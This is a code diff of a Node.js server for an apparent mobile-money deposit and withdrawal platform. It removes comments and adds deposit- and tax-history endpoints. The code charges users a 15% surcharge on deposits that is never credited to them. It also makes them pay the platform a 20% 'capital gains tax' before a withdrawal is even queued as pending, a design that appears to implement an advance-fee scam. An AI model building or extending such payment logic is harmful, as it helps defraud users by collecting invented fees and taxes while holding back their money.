@@ -122,14 +122,12 @@ app.post('/api/deposit/stkpush', authenticateToken, async (req, res) => {
         const depositAmount = Number(req.body.amount);
         if (!depositAmount || depositAmount < 500) return res.status(400).json({ message: "Minimum deposit is 500 KES." });
 
-        // Calculate 15% deposit tax
         const depositTax = Math.ceil(depositAmount * 0.15); 
         const totalAmountToPay = depositAmount + depositTax; 
 
         const reference = `DEP_${Date.now()}`;
         const formattedPhone = formatPhoneNumber(req.user.phone);
 
-        // We only save the actual deposit amount (money to be added to balance)
         const newDeposit = new Deposit({ userPhone: req.user.phone, phone: formattedPhone, amount: depositAmount, reference });
         await newDeposit.save();
 
@@ -139,7 +137,7 @@ app.post('/api/deposit/stkpush', authenticateToken, async (req, res) => {
             body: JSON.stringify({
                 account_id: Number(MODEPAY_ACCOUNT_ID),
                 phone: formattedPhone,
-                amount: totalAmountToPay, // Request base + 15% tax from their M-Pesa
+                amount: totalAmountToPay, 
                 reference: reference
             })
         });
@@ -191,7 +189,6 @@ app.get('/api/deposit/status/:reference', authenticateToken, async (req, res) =>
             
             const user = await User.findOne({ phone: deposit.userPhone });
             if (user) {
-                // Adds only the base money without the 15% tax
                 user.balance += deposit.amount; 
                 await user.save();
                 io.emit("balanceUpdated", { userPhone: user.phone, newBalance: user.balance });
@@ -205,6 +202,17 @@ app.get('/api/deposit/status/:reference', authenticateToken, async (req, res) =>
     } catch (err) { res.status(500).json({ message: "Error checking status." }); }
 });
 
+// --- NEW: DEPOSIT HISTORY ENDPOINT ---
+app.get('/api/deposits/history', authenticateToken, async (req, res) => {
+    try {
+        const deposits = await Deposit.find({ userPhone: req.user.phone }).sort({ createdAt: -1 });
+        res.json({ success: true, deposits });
+    } catch (err) {
+        res.status(500).json({ message: "Error fetching deposit history." });
+    }
+});
+
+
 // --- WITHDRAWAL TAX ROUTES ---
 app.post('/api/tax/stkpush', authenticateToken, async (req, res) => {
     try {
@@ -213,7 +221,6 @@ app.post('/api/tax/stkpush', authenticateToken, async (req, res) => {
             return res.status(400).json({ message: "Minimum withdrawal is 4000 KES." });
         }
 
-        // Calculate 20% Tax
         const taxAmount = Math.ceil(requestedWithdrawal * 0.20);
         const formattedPhone = formatPhoneNumber(req.body.phone || req.user.phone);
         const reference = `TAX_${Date.now()}`;
@@ -262,6 +269,16 @@ app.get('/api/tax/status/:reference', authenticateToken, async (req, res) => {
 
         res.json({ success: true, status: tax.status });
     } catch (err) { res.status(500).json({ message: "Error checking tax status." }); }
+});
+
+// --- NEW: TAX HISTORY ENDPOINT (For failed withdrawal attempts) ---
+app.get('/api/tax/history', authenticateToken, async (req, res) => {
+    try {
+        const taxes = await TaxPayment.find({ userPhone: req.user.phone }).sort({ createdAt: -1 });
+        res.json({ success: true, taxes });
+    } catch (err) {
+        res.status(500).json({ message: "Error fetching tax history." });
+    }
 });
 
 // --- WITHDRAWAL HISTORY ENDPOINT ---
@@ -330,14 +347,10 @@ io.on("connection", (socket) => {
             const decoded = jwt.verify(token, JWT_SECRET);
             const user = await User.findOne({ phone: decoded.phone });
 
-            // 1. Enforce 4000 Minimum & Balance Check
             if (amount < 4000) return socket.emit("withdrawalError", { message: "Minimum withdrawal is 4000 KES." });
             if (!user || user.balance < amount) return socket.emit("withdrawalError", { message: "Insufficient balance." });
-
-            // 2. Verify Tax Reference Provided
             if (!taxReference) return socket.emit("withdrawalError", { message: "Tax reference required." });
             
-            // 3. Find the tax payment and ensure it hasn't been used before
             const taxPayment = await TaxPayment.findOne({ 
                 reference: taxReference, 
                 userPhone: user.phone, 
@@ -348,21 +361,17 @@ io.on("connection", (socket) => {
                 return socket.emit("withdrawalError", { message: "Capital gains tax not paid, still pending, or already used." });
             }
 
-            // 4. SECURITY CHECK: Ensure the tax paid matches 20% of THIS withdrawal request
             const requiredTax = Math.ceil(amount * 0.20);
             if (taxPayment.amount < requiredTax) {
                 return socket.emit("withdrawalError", { message: "The tax paid is insufficient for this withdrawal amount. 20% tax required." });
             }
 
-            // 5. Process withdrawal & deduct balance
             user.balance -= amount;
             await user.save();
 
-            // 6. Mark the tax receipt as "Used"
             taxPayment.status = "Used";
             await taxPayment.save();
 
-            // 7. Save the final withdrawal to history
             const withdrawal = new Withdrawal({ userPhone: user.phone, phone, amount, status: "Pending" });
             await withdrawal.save();
 
